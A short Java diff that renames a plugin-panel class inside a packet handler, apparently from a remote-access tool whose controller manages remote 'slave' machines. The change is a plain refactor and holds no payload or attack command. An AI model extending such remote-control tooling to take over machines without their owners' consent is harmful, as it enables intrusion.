@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 
 import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
-import com.redpois0n.ui.panels.PanelControlPlugins;
+import com.redpois0n.ui.panels.PanelControlLoadedPlugins;
 
 public class Packet67LoadedPlugins extends AbstractIncomingPacket {
 
@@ -14,7 +14,7 @@ public class Packet67LoadedPlugins extends AbstractIncomingPacket {
 		
 		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
 		
-		PanelControlPlugins panel = (PanelControlPlugins) frame.panels.get("view installed plugins");
+		PanelControlLoadedPlugins panel = (PanelControlLoadedPlugins) frame.panels.get("view installed plugins");
 		
 		if (panel != null) {
 			for (int i = 0; i < len; i++) {
